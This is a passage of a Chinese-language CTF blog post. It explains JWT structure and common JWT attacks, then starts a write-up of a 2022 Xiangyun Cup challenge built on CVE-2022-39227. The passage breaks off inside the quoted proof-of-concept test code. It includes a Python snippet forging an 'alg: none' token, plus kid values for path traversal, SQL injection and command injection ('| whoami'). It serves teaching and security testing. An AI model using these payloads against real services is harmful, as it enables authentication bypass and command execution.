    <content type="html"><![CDATA[<h2 id="About-JWT"><a href="#About-JWT" class="headerlink" title="About JWT"></a>About JWT</h2><h3 id="What-is-JWT"><a href="#What-is-JWT" class="headerlink" title="What is JWT"></a>What is JWT</h3><p>Json Web Token(<code>JWT</code>)是一个开放标准(<a href="https://www.rfc-editor.org/rfc/rfc7519">RFC 7519</a>)，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。此信息可以验证和信任，因为它足数字签名的。JWT可以使用密钥(使用 HMAC算法)或便用RSA或 ECDSA 的公钥&#x2F;私钥对进行签名。</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667407544497-f7e889c1-fedb-474e-bd81-57d3cdeb67a1.png" alt="img"></p><p>注意：本文的重心并不在介绍JWT上，所以在官方文本的基础上会有一些删减。</p><p>如需了解更多，可以访问起官方网站，翻阅对应的文献资料：</p><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><hr><h3 id="JWT-format"><a href="#JWT-format" class="headerlink" title="JWT format"></a>JWT format</h3><p>JWT的格式大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Header.Payload.Signature<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667409378048-06076958-9b69-42c2-8f0a-2809a7b250b3.png" alt="img"></p><p>对于任意JWT令牌，我们可以在jwt.io官网或者其他jwt解码工具查看详细：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667412576430-2fd13d4e-8f7f-4cb6-b084-e8e9d5b7036c.png" alt="img"></p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p><code>JWT头</code>是一个描述JWT元数据的<code>JSON对象</code>，<code>alg属性</code>表示签名使用的算法，默认为HMAC SHA256（写为HS256）；<code>typ属性</code>表示令牌的类型，JWT令牌统一写为JWT。</p><p>最后，使用Base64 URL算法将上述JSON对象转换为字符串保存</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p><code>有效载荷</code>部分，是JWT的主体内容部分，也是一个<code>JSON对象</code>，包含需要传递的数据。 </p><p>JWT指定七个默认字段供选择：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">iss：发行人<br>nbf：在此之前不可用(时间戳)<br>iat：发布时间(时间戳)<br>exp：到期时间(时间戳)<br>sub：主题<br>aud：用户<br>jti：JWT ID用于标识该JWT<br></code></pre></td></tr></table></figure><p>这些预定义的字段并不要求强制使用。</p><p>除以上默认字段外，我们还可以自定义私有字段，一般会把包含用户信息的数据放到payload中，如下例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1667141915</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1667141615</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;is_admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;is_login&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5vpXRcirMlzlMPnx0sSX7w&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1667141615</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;f61d&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;f61d&quot;</span><br><span class="hljs-punctuation">&#125;</span><br>#################################################################<br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> exp = <span class="hljs-number">1667141915</span>    ==&gt; TIMESTAMP = <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-30</span> <span class="hljs-number">22</span><span class="hljs-punctuation">:</span><span class="hljs-number">58</span><span class="hljs-punctuation">:</span><span class="hljs-number">35</span> (UTC)<br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> iat = <span class="hljs-number">1667141615</span>    ==&gt; TIMESTAMP = <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-30</span> <span class="hljs-number">22</span><span class="hljs-punctuation">:</span><span class="hljs-number">53</span><span class="hljs-punctuation">:</span><span class="hljs-number">35</span> (UTC)<br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> is_admin = <span class="hljs-number">0</span><br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> is_login = <span class="hljs-number">1</span><br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> jti = <span class="hljs-string">&quot;5vpXRcirMlzlMPnx0sSX7w&quot;</span><br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> nbf = <span class="hljs-number">1667141615</span>    ==&gt; TIMESTAMP = <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-30</span> <span class="hljs-number">22</span><span class="hljs-punctuation">:</span><span class="hljs-number">53</span><span class="hljs-punctuation">:</span><span class="hljs-number">35</span> (UTC)<br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> password = <span class="hljs-string">&quot;f61d&quot;</span><br><span class="hljs-punctuation">[</span>+<span class="hljs-punctuation">]</span> username = <span class="hljs-string">&quot;f61d&quot;</span><br></code></pre></td></tr></table></figure><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>签名哈希部分是对上面两部分数据签名，需要使用base64编码后的header和payload数据，通过指定的算法生成哈希,公式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>注意的是，如果header部分中，参数alg置空，则无该部分(我们也称其为<code>Nonsecure JWT</code>)。</p><h4 id="All-IN"><a href="#All-IN" class="headerlink" title="All IN"></a>All IN</h4><p>在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用.分隔，就构成整个JWT对象</p><p>注意JWT每部分的作用，在服务端接收到客户端发送过来的JWT token之后：</p><ul><li>header和payload可以直接利用base64解码出原文，从header中获取哈希签名的算法，从payload中获取有效数据</li><li>signature由于使用了不可逆的加密算法，无法解码出原文，它的作用是校验token有没有被篡改。服务端获取header中的加密算法之后，利用该算法加上secretKey对header、payload进行加密，比对加密后的数据和客户端发送过来的是否一致。注意secretKey只能保存在服务端，而且对于不同的加密算法其含义有所不同，一般对于MD5类型的摘要加密算法，secretKey实际上代表的是盐值</li></ul><h3 id="JWT-Classification"><a href="#JWT-Classification" class="headerlink" title="JWT Classification"></a>JWT Classification</h3><h4 id="Nonsecure-JWT"><a href="#Nonsecure-JWT" class="headerlink" title="Nonsecure JWT"></a>Nonsecure JWT</h4><p>header部分中，参数alg置空的JWT。</p><h4 id="JWS"><a href="#JWS" class="headerlink" title="JWS"></a>JWS</h4><p><code>JWS</code> ，也就是<code>JWT Signature</code>，其结构就是在之前<code>nonsecure JWT</code>的基础上，在头部声明签名算法，并在最后添加上签名。</p><p>创建签名，是保证jwt不能被他人随意篡改。</p><p>我们通常使用的JWT一般都是<code>JWS</code></p><p>为了完成签名，除了用到header信息和payload信息外，还需要算法的密钥，也就是secretKey。</p><p>加密的算法一般有两类：</p><ul><li>对称加密：secretKey指加密密钥，可以生成签名与验签</li><li>非对称加密：secretKey指私钥，只用来生成签名，不能用来验签(验签用的是公钥)</li></ul><p>JWT的密钥或者密钥对，一般统一称为<code>JSON Web Key</code>，也就是<code>JWK</code></p><p>如需了解JWT的签名算法可以前往其官网查阅：</p><p><a href="https://jwt.io/libraries">https://jwt.io/libraries</a></p><h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><p>如果您想知道如何将JWT用于开发中，请移步另一篇文章：(写作中……)</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>JWT的后端验证是比较多样的，大概的流程可以参考下图：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667832274679-a093cb89-0329-4557-9917-46ad794742b5.png" alt="img"></p><p>这也是说JWT的后端验证多样的原因，如何利用JWT的信息和signature综合的去验证JWT的有效性，在开发者选择使用JWT的适合就要做好相应的准备——生成和验证是一体的。</p><h2 id="Common-Security-risk-of-JWT"><a href="#Common-Security-risk-of-JWT" class="headerlink" title="Common Security risk of JWT"></a>Common Security risk of JWT</h2><p>在简单了解了JWT之后，我们来看看JWT常见的一些安全风险：</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>如果不当的使用Header和Payload部分，在其中存储一些敏感信息，可能会产生一定安全风险，因为两者只经过简单的base64编码。</p><p>当然这种在实际环境中很少见，但是却能成为个别CTF比赛的web签到题的考点（</p><h3 id="签名算法替换"><a href="#签名算法替换" class="headerlink" title="签名算法替换"></a>签名算法替换</h3><p>如果应用不限制 JWT中使用的算法类型，导致算法类型可控，这样会带给JWT巨大的安全风险。</p><h4 id="签名算法置空（CVE-2015-2951）"><a href="#签名算法置空（CVE-2015-2951）" class="headerlink" title="签名算法置空（CVE-2015-2951）"></a>签名算法置空（CVE-2015-2951）</h4><p>我们知道在JWT的头部中声明了token的类型和签名用的算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上header指定了签名算法为<code>HS256</code>，意味着服务端利用此算法将header和payload进行加密，形成signature，同时接收到token时，也会利用此算法对signature进行签名验证。</p><p>如果后端程序信任来源的JWT头部，那么当我们改变器头部算法，将其置空设置为</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">None</span><br></code></pre></td></tr></table></figure><p>那么服务端接收到token后会将其认定为无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token。</p><p>当然这一切的前提是，后端信任前端。</p><p>比如2022年首届数据安全题目中的一道web题，我们就可以通过该方法伪造token。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 可以通过令algorithm为空，绕过对签名和密钥的检验</span><br><span class="hljs-keyword">import</span> jwt<br>payload = &#123;<br><span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>token = jwt.encode(payload=payload,algorithm=<span class="hljs-literal">None</span>,key=<span class="hljs-literal">None</span>)<br><span class="hljs-built_in">print</span>(token)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667835816438-f3804cff-1113-48bf-87d2-c39f6138eb8d.png" alt="img"></p><h4 id="非对称密码算法修改为对称算法-密钥混淆CVE-2016-10555"><a href="#非对称密码算法修改为对称算法-密钥混淆CVE-2016-10555" class="headerlink" title="非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)"></a>非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)</h4><p>HMAC和RSA是JWT比较常见的两种算法。</p><p>HMAC：token使用密钥签名，然后使用相同的密钥进行验证。（对称）</p><p>RSA    ：token将首先使用私钥创建，然后使用相应的公钥进行验证。（非对称）</p><p>对于两者，密钥和私钥都要保密，因为签名和校验依赖它们。</p><p>这里假设一个网站使用RSA生成和验证token，那么这里会有两个变量参与：私钥Prit和公钥Pub。</p><p>如果签名算法可控，我们将算法头改为<code>HMAC</code>，使用RSA的公钥Pub来生成一个token，那么我们将构造好的JWT发送回去时，后端验证查询则会用RSA的公钥Pub以HMAC的算法验证方式来验证token。</p><p>当然如果该漏洞存在，那么对于使用非对称加密的token，我们都可以尝试这样的方法，比如RS256变成HS256，比如这一道CTF题目：</p><p><a href="https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/">https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/</a></p><h3 id="签名未校验-x2F-无效签名"><a href="#签名未校验-x2F-无效签名" class="headerlink" title="签名未校验&#x2F; 无效签名"></a>签名未校验&#x2F; 无效签名</h3><p>某些服务端并未校验JWT签名，可以尝试修改signature后(或者直接删除signature)，亦或者直接修改payload。</p><p>找到一个只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。</p><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicHJvYml1cyIsImFjdGlvbiI6InByb2ZpbGUifQ<span class="hljs-number">.5</span>GVEWIw7-IdM9fQMt6H5Wxpmp1HpnyQb33CsXnZ9qKM<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667840468890-8287cdc1-a5bd-4d5b-ba08-abc6165b11b8.png" alt="img"></p><p>如果我们直接修改payload段，使用修改后的token重放，如访问页面正常，则说明漏洞存在。</p><h3 id="伪造密钥-CVE-2018-0114"><a href="#伪造密钥-CVE-2018-0114" class="headerlink" title="伪造密钥(CVE-2018-0114)"></a>伪造密钥(CVE-2018-0114)</h3><p>jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。</p><p>比如CVE-2018-0114： </p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114</a></p><p>攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。</p><p>比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;RS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;jwk&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;kty&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;RSA&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;kid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TEST&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;use&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sig&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AQAB&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;n&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h3><p>按照JWT的结构，我们是可以得知其使用的签名算法的，如果可以爆破出对应的密钥，我们就能随意的”伪造”token了。</p><p>这里以HMAC签名举例：</p><p>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>因此，HMAC JWT破解是离线的，通过JWT破解工具，可以快速检查已知的泄漏密码列表或默认密码。</p><p>工具会在下边介绍。</p><h3 id="泄露密钥"><a href="#泄露密钥" class="headerlink" title="泄露密钥"></a>泄露密钥</h3><p>这个一般得打组合拳，配合如目录遍历、XXE、SSRF等可以读取存储密钥值文件漏洞，这样就可以窃取密钥并签署任意token。</p><h3 id="KID操控"><a href="#KID操控" class="headerlink" title="KID操控"></a>KID操控</h3><p>KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。KID参数的正确用法如下所示：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;kid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment">//使用密钥1验证token</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>由于此字段是由用户控制的，因此可能会被恶意操纵并导致危险的后果。</p><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;kid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../../public/css/main.css&quot;</span>   <span class="hljs-comment">//使用公共文件main.css验证token</span><br></code></pre></td></tr></table></figure><p>这样我们就可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>KID也可以用于在数据库中检索密钥。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。<br>如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;kid&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span>  <span class="hljs-comment">//Use a string &quot;key&quot; Authentication token</span><br></code></pre></td></tr></table></figure><p>上面这个注入会导致应用程序返回字符串“ key”,</p><p>因为数据库中不存在名为”aaaaaaa”的密钥，然后使用字符串“ key”作为密钥来认证token。</p><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。<br>一些函数就能给此类型攻击可乘之机，比如Ruby open（）。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;key_file&quot;</span> | whoami;<br></code></pre></td></tr></table></figure><p>类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似<code>system()</code>，<code>exec()</code>的函数时，都会产生此种漏洞。</p><h3 id="其他头部参数操控"><a href="#其他头部参数操控" class="headerlink" title="其他头部参数操控"></a>其他头部参数操控</h3><p>除KID外，JWT标准还能让开发人员通过URL指定密钥。</p><h4 id="JKU头部参数"><a href="#JKU头部参数" class="headerlink" title="JKU头部参数"></a>JKU头部参数</h4><p>JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">jku URL-&gt;包含JWK集的文件-&gt;用于验证令牌的JWK<br></code></pre></td></tr></table></figure><h4 id="操纵X5U，X5C-URL"><a href="#操纵X5U，X5C-URL" class="headerlink" title="操纵X5U，X5C URL"></a>操纵X5U，X5C URL</h4><p>同JKU或JWK头部类似，x5u和x5c头部参数允许攻击者用于验证Token的公钥证书或证书链。x5u以URI形式指定信息，而x5c允许将证书值嵌入token中。</p><h2 id="JWTtool"><a href="#JWTtool" class="headerlink" title="JWTtool"></a>JWTtool</h2><p>如果您需要对您使用JWT的网站进行安全测试，这里也有对应的工具，比如JWTtool，上述常见的JWT漏洞都可以使用该工具进行利用：</p><p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p><p>同时你也能在该项目的Wiki网站上获取更多jwt的知识：</p><p><a href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p><h2 id="2022-XiangyunCup-FunWeb"><a href="#2022-XiangyunCup-FunWeb" class="headerlink" title="2022 XiangyunCup FunWeb"></a>2022 XiangyunCup FunWeb</h2><p>我们来看看2022年祥云杯的Web题——FunWeb。</p><p>这道题并没有考察传统的JWT漏洞 而是选择一个比较新的 1day (CVE-2022-39227 )来出题。</p><p>经典的开局一个登录框，登录页面抓包后先跑了admin的弱口令，当然现在的题一般没这么容易，并没有结果。</p><p>老老实实注册进去，有两个可以点的，一个是查看flag，一个是查看成绩，点击之后发现都需要admin身份，所以抓包分析看到了一下，发现<code>xxx.yyy.zzz</code>的token结构，下意识就去jwt.io解码了：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667845643643-eebf4026-3cc5-4319-a90a-583b1cdc0edf.png" alt="img"></p><p>从payload可以判断大概这里就是突破点。</p><p>当然面对这样一道JWT的题目，常规攻击手段肯定是首选，不过这样的题目，如果常规打不下来，就得考虑在github上面找commit了。</p><p>所以在一天常规攻击无果后，于是开始找最近有关jwt的day，然后队里另外一位师傅翻到了python jwt的1day，也就是CVE-2022-39227</p><p><a href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p><p>拉到最后我们可以看到作者在test中提供了漏洞POC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot; Test claim forgery vulnerability fix &quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> test.common <span class="hljs-keyword">import</span> generated_keys<br><span class="hljs-keyword">from</span> test <span class="hljs-keyword">import</span> python_jwt <span class="hljs-keyword">as</span> jwt<br><span class="hljs-keyword">from</span> pyvows <span class="hljs-keyword">import</span> Vows, expect<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><br><span class="hljs-meta">@Vows.batch</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForgedClaims</span>(Vows.Context):<br>    <span class="hljs-string">&quot;&quot;&quot; Check we get an error when payload is forged using mix of compact and JSON formats &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Generate token &quot;&quot;&quot;</span><br>        payload = &#123;<span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>&#125;<br>        <span class="hljs-keyword">return</span> jwt.generate_jwt(payload, generated_keys[<span class="hljs-string">&#x27;PS256&#x27;</span>], <span class="hljs-string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="hljs-number">60</span>))<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyglotToken</span>(Vows.Context):<br>        <span class="hljs-string">&quot;&quot;&quot; Make a forged token &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self, topic</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>            [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>            parsed_payload = loads(base64url_decode(payload))<br>            parsed_payload[<span class="hljs-string">&#x27;sub&#x27;</span>] = <span class="hljs-string">&#x27;bob&#x27;</span><br>            parsed_payload[<span class="hljs-string">&#x27;exp&#x27;</span>] = <span class="hljs-number">2000000000</span><br>            fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, 